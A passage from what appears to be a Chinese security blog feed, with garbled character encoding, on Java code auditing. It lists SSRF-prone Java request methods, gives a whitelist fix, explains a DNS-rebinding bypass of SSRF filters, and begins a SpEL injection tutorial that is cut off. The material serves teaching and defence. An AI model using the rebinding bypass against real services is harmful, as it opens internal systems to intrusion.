class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Author: JoyChou(2017å¹´04æœˆ11æ—¥)</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-comment">/* ç¬¬ä¸€ç§æƒ…å†µ</span><br><span class="hljs-comment"> * Requestç±»</span><br><span class="hljs-comment"> */</span><br>Request.Get(url).execute()<br><br><span class="hljs-comment">/* ç¬¬äºŒç§æƒ…å†µ</span><br><span class="hljs-comment"> * URLç±»çš„openStream</span><br><span class="hljs-comment"> */</span><br> URL u;<br> <span class="hljs-type">int</span> length;<br> <span class="hljs-type">byte</span>[] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br> u = <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(url);<br> inputStream = u.openStream();<br><br><span class="hljs-comment">/* ç¬¬ä¸‰ç§æƒ…å†µ</span><br><span class="hljs-comment"> * HttpClient</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;http://127.0.0.1&quot;</span>;<br><span class="hljs-type">CloseableHttpClient</span> <span class="hljs-variable">client</span> <span class="hljs-operator">=</span> HttpClients.createDefault();<br><span class="hljs-type">HttpGet</span> <span class="hljs-variable">httpGet</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HttpGet</span>(url);<br>HttpResponse httpResponse;<br><span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-comment">// è¯¥è¡Œä»£ç å‘èµ·ç½‘ç»œè¯·æ±‚</span><br>    httpResponse = client.execute(httpGet);<br><br><span class="hljs-comment">/* ç¬¬å››ç§æƒ…å†µ</span><br><span class="hljs-comment"> * URLConnectionå’ŒHttpURLConnection</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">URLConnection</span> <span class="hljs-variable">urlConnection</span> <span class="hljs-operator">=</span> url.openConnection();<br><span class="hljs-type">HttpURLConnection</span> <span class="hljs-variable">urlConnection</span> <span class="hljs-operator">=</span> url.openConnection();<br></code></pre></td></tr></table></figure><h3 id="æ¼æ´ä¿®å¤"><a href="#æ¼æ´ä¿®å¤" class="headerlink" title="æ¼æ´ä¿®å¤"></a>æ¼æ´ä¿®å¤</h3><p>é‚£ä¹ˆï¼Œæ ¹æ®åˆ©ç”¨çš„æ–¹å¼ï¼Œä¿®å¤æ–¹æ³•å°±æ¯”è¾ƒç®€å•ã€‚</p><ul><li>é™åˆ¶åè®®ä¸ºHTTPã€HTTPSåè®®ã€‚</li><li>ç¦æ­¢URLä¼ å…¥å†…ç½‘IPæˆ–è€…è®¾ç½®URLç™½åå•ã€‚</li><li>ä¸ç”¨é™åˆ¶302é‡å®šå‘ã€‚</li></ul><p>æ¼æ´ä¿®å¤ä»£ç å¦‚ä¸‹ï¼š</p><p>éœ€è¦æ·»åŠ guavaåº“(ç›®çš„æ˜¯è·å–ä¸€çº§åŸŸå)ï¼Œåœ¨pom.xmlä¸­æ·»åŠ </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;dependency&gt;<br>    &lt;groupId&gt;com.google.guava&lt;/groupId&gt;<br>    &lt;artifactId&gt;guava&lt;/artifactId&gt;<br>    &lt;version&gt;<span class="hljs-number">21.0</span>&lt;/version&gt;<br>&lt;/dependency&gt;<br></code></pre></td></tr></table></figure><p>ä»£ç çš„éªŒè¯é€»è¾‘ï¼š</p><ol><li>éªŒè¯åè®®æ˜¯å¦ä¸ºhttpæˆ–è€…https</li><li>éªŒè¯urlæ˜¯å¦åœ¨ç™½åå•å†…</li></ol><p>å‡½æ•°è°ƒç”¨ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">String[] urlwhitelist = &#123;<span class="hljs-string">&quot;joychou.org&quot;</span>, <span class="hljs-string">&quot;joychou.me&quot;</span>&#125;;<br><span class="hljs-keyword">if</span> (!securitySSRFUrlCheck(url, urlwhitelist)) &#123;<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>å‡½æ•°éªŒè¯ä»£ç ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Boolean <span class="hljs-title function_">securitySSRFUrlCheck</span><span class="hljs-params">(String url, String[] urlwhitelist)</span> &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-type">URL</span> <span class="hljs-variable">u</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(url);<br>        <span class="hljs-comment">// åªå…è®¸httpå’Œhttpsçš„åè®®é€šè¿‡</span><br>        <span class="hljs-keyword">if</span> (!u.getProtocol().startsWith(<span class="hljs-string">&quot;http&quot;</span>) &amp;&amp; !u.getProtocol().startsWith(<span class="hljs-string">&quot;https&quot;</span>)) &#123;<br>            <span class="hljs-keyword">return</span>  <span class="hljs-literal">false</span>;<br>        &#125;<br>        <span class="hljs-comment">// è·å–åŸŸåï¼Œå¹¶è½¬ä¸ºå°å†™</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">host</span> <span class="hljs-operator">=</span> u.getHost().toLowerCase();<br>        <span class="hljs-comment">// è·å–ä¸€çº§åŸŸå</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">rootDomain</span> <span class="hljs-operator">=</span> InternetDomainName.from(host).topPrivateDomain().toString();<br><br>        <span class="hljs-keyword">for</span> (String whiteurl: urlwhitelist)&#123;<br>            <span class="hljs-keyword">if</span> (rootDomain.equals(whiteurl)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br><br>    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="DNS-Rebinding-Bypass-SSRF"><a href="#DNS-Rebinding-Bypass-SSRF" class="headerlink" title="DNS Rebinding Bypass SSRF"></a>DNS Rebinding Bypass SSRF</h3><p>è¯¦ç»†è¯·çœ‹ï¼š<a href="https://xz.aliyun.com/news/8300">https://xz.aliyun.com/news/8300</a></p><p>ç”±äºæˆ‘ä»¬æ˜¯ç”¨å®ƒæ¥ç»•è¿‡SSRFæ¼æ´ï¼Œæ‰€ä»¥ç®€å•ç†è§£å°±æ˜¯ï¼šå½“æŸä¸€ä¸ªSSRFæ£€æµ‹æ˜¯é€šè¿‡DNSè§£æåçš„<code>ipåœ°å€</code>æ¥åˆ¤æ–­æ˜¯å¦ä¸ºå®‰å…¨åœ°å€çš„è¯ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡<code>DNS rebinding</code>æ¥è¿›è¡Œç»•è¿‡ã€‚</p><h4 id="ä¼ ç»ŸSSRFè¿‡æ»¤æµç¨‹"><a href="#ä¼ ç»ŸSSRFè¿‡æ»¤æµç¨‹" class="headerlink" title="ä¼ ç»ŸSSRFè¿‡æ»¤æµç¨‹"></a>ä¼ ç»ŸSSRFè¿‡æ»¤æµç¨‹</h4><ol><li>è·å–åˆ°è¾“å…¥çš„URLï¼Œä»è¯¥URLä¸­æå–host</li><li>å¯¹è¯¥hostè¿›è¡ŒDNSè§£æï¼Œè·å–åˆ°è§£æçš„IP</li><li>æ£€æµ‹è¯¥IPæ˜¯å¦æ˜¯åˆæ³•çš„ï¼Œæ¯”å¦‚æ˜¯å¦æ˜¯ç§æœ‰IPç­‰</li><li>å¦‚æœIPæ£€æµ‹ä¸ºåˆæ³•çš„ï¼Œåˆ™è¿›å…¥curlçš„é˜¶æ®µå‘åŒ…</li></ol><p>ä»DNSè§£æçš„è§’åº¦æ¥çœ‹ï¼Œè¿™ä¸ªè¿‡ç¨‹ä¸€å…±æœ‰ä¸¤æ¬¡è§£æï¼Œç¬¬ä¸€æ¬¡æ˜¯<code>å¯¹è¯¥hostè¿›è¡ŒDNSè§£æ</code>ï¼Œç¬¬äºŒæ¬¡æ˜¯<code>è¿›å…¥curlçš„é˜¶æ®µå‘åŒ…</code>ï¼Œè¿™ä¸¤æ¬¡è¯·æ±‚ä¹‹é—´å­˜åœ¨ä¸€ä¸ªæ—¶é—´å·®ï¼Œå¦‚æœæˆ‘ä»¬èƒ½å¤Ÿä¿®æ”¹DNSåœ°å€åœ¨ç¬¬ä¸€æ¬¡è¯·æ±‚çš„æ—¶å€™ä¸ºåˆæ³•åœ°å€ï¼Œç¬¬äºŒæ¬¡è¯·æ±‚æ—¶ä¸ºæ¶æ„åœ°å€ï¼Œå°±å¯ä»¥ç»•è¿‡è¿™ä¸ªæ£€æµ‹äº†ã€‚</p><h4 id="DNS-Rebindingå¦‚ä½•åˆ©ç”¨ï¼Ÿ"><a href="#DNS-Rebindingå¦‚ä½•åˆ©ç”¨ï¼Ÿ" class="headerlink" title="DNS Rebindingå¦‚ä½•åˆ©ç”¨ï¼Ÿ"></a>DNS Rebindingå¦‚ä½•åˆ©ç”¨ï¼Ÿ</h4><blockquote><p>æ”»å‡»è€…æ³¨å†Œä¸€ä¸ªåŸŸåï¼ˆå¦‚attacker.comï¼‰ï¼Œå¹¶åœ¨æ”»å‡»è€…æ§åˆ¶ä¸‹å°†å…¶ä»£ç†ç»™DNSæœåŠ¡å™¨ã€‚ æœåŠ¡å™¨é…ç½®ä¸ºå¾ˆçŸ­å“åº”æ—¶é—´çš„TTLè®°å½•ï¼Œé˜²æ­¢å“åº”è¢«ç¼“å­˜ã€‚ å½“å—å®³è€…æµè§ˆåˆ°æ¶æ„åŸŸæ—¶ï¼Œæ”»å‡»è€…çš„DNSæœåŠ¡å™¨é¦–å…ˆç”¨æ‰˜ç®¡æ¶æ„å®¢æˆ·ç«¯ä»£ç çš„æœåŠ¡å™¨çš„IPåœ°å€ä½œå‡ºå“åº”ã€‚ ä¾‹å¦‚ï¼Œä»–ä»¬å¯ä»¥å°†å—å®³è€…çš„æµè§ˆå™¨æŒ‡å‘åŒ…å«æ—¨åœ¨åœ¨å—å®³è€…è®¡ç®—æœºä¸Šæ‰§è¡Œçš„æ¶æ„JavaScriptæˆ–Flashè„šæœ¬çš„ç½‘ç«™ã€‚<br>æ¶æ„å®¢æˆ·ç«¯ä»£ç ä¼šå¯¹åŸå§‹åŸŸåï¼ˆä¾‹å¦‚attacker.comï¼‰è¿›è¡Œé¢å¤–è®¿é—®ã€‚ è¿™äº›éƒ½æ˜¯ç”±åŒæºæ”¿ç­–æ‰€å…è®¸çš„ã€‚ ä½†æ˜¯ï¼Œå½“å—å®³è€…çš„æµè§ˆå™¨è¿è¡Œè¯¥è„šæœ¬æ—¶ï¼Œå®ƒä¼šä¸ºè¯¥åŸŸåˆ›å»ºä¸€ä¸ªæ–°çš„DNSè¯·æ±‚ï¼Œå¹¶ä¸”æ”»å‡»è€…ä¼šä½¿ç”¨æ–°çš„IPåœ°å€è¿›è¡Œå›å¤ã€‚ ä¾‹å¦‚ï¼Œä»–ä»¬å¯ä»¥ä½¿ç”¨å†…éƒ¨IPåœ°å€æˆ–äº’è”ç½‘ä¸ŠæŸä¸ªç›®æ ‡çš„IPåœ°å€è¿›è¡Œå›å¤ã€‚</p></blockquote><p>TTLæ˜¯ä¸€æ¡åŸŸåè§£æè®°å½•åœ¨DNSæœåŠ¡å™¨ä¸­çš„å­˜ç•™æ—¶é—´ã€‚æŠŠè¿™ä¸ªå€¼è®¾ç½®çš„éå¸¸å°å¯ä»¥é˜²æ­¢DNSè§£æç»“æœè¢«ç¼“å­˜ï¼Œè¿›è€Œä½¿å¾—æ¯æ¬¡è·å–DNSè§£æç»“æœæ˜¯ä¸åŒçš„ã€‚</p><p>ç®€å•ç†ä¸€ä¸‹è¿™ä¸ªè¿‡ç¨‹ï¼š</p><ol><li>æ”»å‡»è€…é…ç½®äº†ä¸€å°DNSæœåŠ¡å™¨ç”¨äºè§£ææŸåŸŸå</li><li>æ¯æ¬¡è¯·æ±‚åè¿”å›çš„è§£æç»“æœä¸ä¸€æ ·ï¼Œåˆ†åˆ«æ˜¯ä¸€ä¸ªåˆæ³•åœ°å€ï¼Œä¸€ä¸ªæ˜¯æ¶æ„åœ°å€</li><li>å½“æœåŠ¡å™¨åœ¨ç¬¬ä¸€æ¬¡è¯·æ±‚çš„æ—¶å€™è¿”å›åˆæ³•åœ°å€ï¼Œç¬¬äºŒæ¬¡è¯·æ±‚æ—¶è¿”å›çš„æ˜¯æ¶æ„åœ°å€ã€‚å°±å¯ä»¥ç»•è¿‡é™åˆ¶è¿›è¡Œåˆ©ç”¨</li></ol><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><p><a href="https://xz.aliyun.com/news/195">SSRF in Java-å…ˆçŸ¥ç¤¾åŒº (aliyun.com)</a></p><p><a href="https://www.cnblogs.com/nice0e3/p/13683023.html">Java å®¡è®¡ä¹‹SSRFç¯‡ï¼ˆç»­ï¼‰ - nice_0e3 - åšå®¢å›­ (cnblogs.com)</a></p><p><a href="https://www.cnblogs.com/nice0e3/p/13682434.html">Java å®¡è®¡ä¹‹SSRFç¯‡ - nice_0e3 - åšå®¢å›­ (cnblogs.com)</a></p><p><a href="https://xz.aliyun.com/news/8300">DNS Rebinding Bypass SSRF-å…ˆçŸ¥ç¤¾åŒº (aliyun.com)</a></p>]]></content>
    
    
    <categories>
      
      <category>Javaä»£ç å®¡è®¡</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Javaä»£ç å®¡è®¡</tag>
      
      <tag>æ¼æ´å­¦ä¹ </tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Javaä»£ç å®¡è®¡ä¸­çš„SpELæ³¨å…¥</title>
    <link href="/2025/07/23/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B8%AD%E7%9A%84SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/"/>
    <url>/2025/07/23/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B8%AD%E7%9A%84SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h3 id="SpELè¡¨è¾¾å¼çš„åŠŸèƒ½ä¸ä½¿ç”¨"><a href="#SpELè¡¨è¾¾å¼çš„åŠŸèƒ½ä¸ä½¿ç”¨" class="headerlink" title="SpELè¡¨è¾¾å¼çš„åŠŸèƒ½ä¸ä½¿ç”¨"></a>SpELè¡¨è¾¾å¼çš„åŠŸèƒ½ä¸ä½¿ç”¨</h3><h4 id="åŠŸèƒ½"><a href="#åŠŸèƒ½" class="headerlink" title="åŠŸèƒ½"></a>åŠŸèƒ½</h4><ul><li>è®¿é—®å¯¹è±¡å±æ€§ï¼šSpELè¡¨è¾¾å¼å¯ä»¥é€šè¿‡å¯¹è±¡å¼•ç”¨æ¥è®¿é—®å¯¹è±¡çš„å±æ€§ï¼Œä¾‹å¦‚${object.property}ã€‚</li><li>è°ƒç”¨æ–¹æ³•ï¼šSpELè¡¨è¾¾å¼å¯ä»¥è°ƒç”¨å¯¹è±¡çš„æ–¹æ³•ï¼Œä¾‹å¦‚${object.method()}ã€‚</li><li>è¿›è¡Œç®—æœ¯è¿ç®—ï¼šSpELè¡¨è¾¾å¼æ”¯æŒå„ç§ç®—æœ¯è¿ç®—ç¬¦ï¼Œå¦‚åŠ æ³•ã€å‡æ³•ã€ä¹˜æ³•å’Œé™¤æ³•ã€‚</li><li>è¿›è¡Œé€»è¾‘è¿ç®—ï¼šSpELè¡¨è¾¾å¼æ”¯æŒé€»è¾‘è¿ç®—ç¬¦ï¼Œå¦‚ä¸ã€æˆ–ã€éç­‰ã€‚</li><li>è¿›è¡Œæ¡ä»¶åˆ¤æ–­ï¼šSpELè¡¨è¾¾å¼å¯ä»¥è¿›è¡Œæ¡ä»¶åˆ¤æ–­ï¼Œä¾‹å¦‚é€šè¿‡ifè¯­å¥åˆ¤æ–­æ¡ä»¶ï¼Œå¹¶æ‰§è¡Œç›¸åº”çš„æ“ä½œã€‚</li><li>è®¿é—®é›†åˆå…ƒç´ å’Œå±æ€§ï¼šSpELè¡¨è¾¾å¼å¯ä»¥é€šè¿‡ç´¢å¼•æˆ–é”®æ¥è®¿é—®é›†åˆä¸­çš„å…ƒç´ æˆ–å¯¹è±¡çš„å±æ€§ã€‚</li><li>æ‰§è¡Œæ­£åˆ™è¡¨è¾¾å¼åŒ¹é…ï¼šSpELè¡¨è¾¾å¼å¯ä»¥æ‰§è¡Œæ­£åˆ™è¡¨è¾¾å¼åŒ¹é…ï¼Œå¹¶è¿”å›åŒ¹é…ç»“æœã€‚</li><li>è®¿é—®ä¸Šä¸‹æ–‡å˜é‡å’Œå‚æ•°ï¼šSpELè¡¨è¾¾å¼å¯ä»¥è®¿é—®ä¸Šä¸‹æ–‡ä¸­çš„å˜é‡å’Œæ–¹æ³•å‚æ•°ã€‚</li><li>è¿›è¡Œç±»å‹è½¬æ¢ï¼šSpELè¡¨è¾¾å¼å¯ä»¥è¿›è¡Œç±»å‹è½¬æ¢æ“ä½œï¼Œå°†ä¸€ä¸ªå¯¹è±¡è½¬æ¢ä¸ºå¦ä¸€ç§ç±»å‹ã€‚</li><li>æ”¯æŒç‰¹æ®Šæ“ä½œç¬¦ï¼šSpELè¡¨è¾¾å¼æ”¯æŒä¸€äº›ç‰¹æ®Šçš„æ“ä½œç¬¦ï¼Œå¦‚Elvisæ“ä½œç¬¦ï¼ˆ?:ï¼‰ã€å®‰å…¨å¯¼èˆªæ“ä½œç¬¦ï¼ˆ?.ï¼‰ç­‰ã€‚</li></ul><h4 id="ä½¿ç”¨"><a href="#ä½¿ç”¨" class="headerlink" title="ä½¿ç”¨"></a>ä½¿ç”¨</h4><h5 id="è¡¨è¾¾å¼"><a href="#è¡¨è¾¾å¼" class="headerlink" title="è¡¨è¾¾å¼"></a>è¡¨è¾¾å¼</h5><p>ä¸€èˆ¬SpELè¡¨è¾¾å¼è¯­æ³•ä¸pythonè¯­æ³•æœ‰äº›åƒï¼Œæ­¤å¤„æœ‰è¯¦ç»†æ€»ç»“ï¼š<a href="https://blog.csdn.net/A_art_xiang/article/details/134370029">Spring-SpELè¡¨è¾¾å¼è¶…çº§è¯¦ç»†ä½¿ç”¨å…¨è§£-CSDNåšå®¢</a></p><p>è¿™é‡Œæ¥çœ‹å‡ ä¸ªè¾ƒä¸ºç‰¹æ®Šçš„ç”¨æ³•</p><p>spelè¯­æ³•ä¸­çš„<code>T()</code>æ“ä½œç¬¦ , <code>T()</code>æ“ä½œç¬¦ä¼šè¿”å›ä¸€ä¸ªobject , å®ƒå¯ä»¥å¸®åŠ©æˆ‘ä»¬è·å–æŸä¸ªç±»çš„é™æ€æ–¹æ³• , ç”¨æ³•<code>T(å…¨é™å®šç±»å).æ–¹æ³•å()</code>ï¼Œåé¢ä¼šç”¨å¾—åˆ°</p><p>spelä¸­çš„<code>#</code>æ“ä½œç¬¦å¯ä»¥ç”¨äºæ ‡è®°å¯¹è±¡ï¼ŒSpEL è¡¨è¾¾å¼å¯ä»¥ç”¨ <code>#å˜é‡å</code> çš„å½¢å¼è®¿é—®å®ƒä»¬</p><ol><li><p>è·å–ç±»çš„ç±»å‹<br>å¯ä»¥ä½¿ç”¨ç‰¹æ®Šçš„Tè¿ç®—ç¬¦æ¥æŒ‡å®šjava.lang.Classçš„å®ä¾‹(ç±»å‹)ã€‚é™æ€æ–¹æ³•ä¹Ÿæ˜¯é€šè¿‡ä½¿ç”¨è¿™ä¸ªæ“ä½œç¬¦æ¥è°ƒç”¨çš„ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">ExpressionParser</span> <span class="hljs-variable">parser</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SpelExpressionParser</span>();<br><br><span class="hljs-type">Class</span> <span class="hljs-variable">dateClass</span> <span class="hljs-operator">=</span> parser.parseExpression(<span class="hljs-string">&quot;T(java.util.Date)&quot;</span>).getValue(Class.class);<br><br><span class="hljs-type">Class</span> <span class="hljs-variable">stringClass</span> <span class="hljs-operator">=</span> parser.parseExpression(<span class="hljs-string">&quot;T(String)&quot;</span>).getValue(Class.class);<br><br><span class="hljs-type">boolean</span> <span class="hljs-variable">trueValue</span> <span class="hljs-operator">=</span> parser.parseExpression(<br>                <span class="hljs-string">&quot;T(java.math.RoundingMode).CEILING &lt; T(java.math.RoundingMode).FLOOR&quot;</span>)<br>        .getValue(Boolean.class);<br><br></code></pre></td></tr></table></figure></li><li><p>ç”¨ <code>#å˜é‡å</code> çš„å½¢å¼è®¿é—®å˜é‡</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">context.setVariable(<span class="hljs-string">&quot;x&quot;</span>, <span class="hljs-number">10</span>);<br><span class="hljs-type">Integer</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> parser.parseExpression(<span class="hljs-string">&quot;#x + 20&quot;</span>).getValue(context, Integer.class); <span class="hljs-comment">// ç»“æœï¼š30</span><br></code></pre></td></tr></table></figure></li><li><p>è¡¨è¾¾å¼æ¨¡æ¿</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// é€šå¸¸ä½¿ç”¨#&#123;&#125;ä½œä¸ºæ¨¡æ¿ï¼Œä¸å­—ç¬¦ä¸²æ‹¼æ¥èµ·æ¥</span><br><span class="hljs-type">String</span> <span class="hljs-variable">randomPhrase</span> <span class="hljs-operator">=</span> parser.parseExpression(<br>        <span class="hljs-string">&quot;random number is #&#123;T(java.lang.Math).random()&#125;&quot;</span>,<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplateParserContext</span>()).getValue(String.class);<br><br><span class="hljs-comment">// evaluates to &quot;random number is 0.7038186818312008&quot;</span><br><br></code></pre></td></tr></table></figure><p>æˆ–è€…æ‰¾åˆ°æºç ä¸­å®šä¹‰çš„åœ°æ–¹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// TemplateParserContext çš„å®šä¹‰</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TemplateParserContext</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ParserContext</span> &#123;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getExpressionPrefix</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;#&#123;&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getExpressionSuffix</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&#125;&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isTemplate</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><h5 id="è°ƒç”¨"><a href="#è°ƒç”¨" class="headerlink" title="è°ƒç”¨"></a>è°ƒç”¨</h5><p>SpELè°ƒç”¨æµç¨‹ : 1.æ–°å»ºè§£æå™¨ 2.è§£æè¡¨è¾¾å¼ 3.æ³¨å†Œå˜é‡(å¯çœ,åœ¨å–å€¼ä¹‹å‰æ³¨å†Œ) 4.å–å€¼</p><p>ç¤ºä¾‹1:ä¸æ³¨å†Œæ–°å˜é‡çš„ç”¨æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">ExpressionParser</span> <span class="hljs-variable">parser</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SpelExpressionParser</span>();<span class="hljs-comment">//åˆ›å»ºè§£æå™¨</span><br><span class="hljs-type">Expression</span> <span class="hljs-variable">exp</span> <span class="hljs-operator">=</span> parser.parseExpression(<span class="hljs-string">&quot;&#x27;Hello World&#x27;.concat(&#x27;!&#x27;)&quot;</span>);<span class="hljs-comment">//è§£æè¡¨è¾¾å¼</span><br>System.out.println( exp.getValue() );<span class="hljs-comment">//å–å€¼ï¼ŒHello Worldï¼</span><br></code></pre></td></tr></table></figure><p>ç¤ºä¾‹2:è‡ªå®šä¹‰æ³¨å†ŒåŠ è½½å˜é‡çš„ç”¨æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Spel</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;ä½•æ­¢&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Spel</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Spel</span>();<br>        StandardEvaluationContext context=<span class="hljs-keyword">new</span> <span class="hljs-title class_">StandardEvaluationContext</span>();<br>        context.setVariable(<span class="hljs-string">&quot;user&quot;</span>,user);<span class="hljs-comment">//é€šè¿‡StandardEvaluationContextæ³¨å†Œè‡ªå®šä¹‰å˜é‡</span><br>        <span class="hljs-type">SpelExpressionParser</span> <span class="hljs-variable">parser</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SpelExpressionParser</span>();<span class="hljs-comment">//åˆ›å»ºè§£æå™¨</span><br>        <span class="hljs-type">Expression</span> <span class="hljs-variable">expression</span> <span class="hljs-operator">=</span> parser.parseExpression(<span class="hljs-string">&quot;#user.name&quot;</span>);<span class="hljs-comment">//è§£æè¡¨è¾¾å¼</span><br>        System.out.println( expression.getValue(context).toString() );<span class="hljs-comment">//å–å€¼,è¾“å‡ºä½•æ­¢</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="SpELè¡¨è¾¾å¼æ³¨å…¥æ”»å‡»"><a href="#SpELè¡¨è¾¾å¼æ³¨å…¥æ”»å‡»" class="headerlink" title="SpELè¡¨è¾¾å¼æ³¨å…¥æ”»å‡»"></a>SpELè¡¨è¾¾å¼æ³¨å…¥æ”»å‡»</h3><h4 id="æ”»å‡»æµç¨‹"><a href="#æ”»å‡»æµç¨‹" class="headerlink" title="æ”»å‡»æµç¨‹"></a>æ”»å‡»æµç¨‹</h4><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/89d8d5cfac7a40b9bb61835a5fd9b5f4~tplv-k3u1fbpfcp-zoom-in-crop-mark:1512:0:0:0.awebp"></p><h4 id="æ”»å‡»æ¡ä»¶-æ•æ„Ÿå‡½æ•°"><a href="#æ”»å‡»æ¡ä»¶-æ•æ„Ÿå‡½æ•°" class="headerlink" 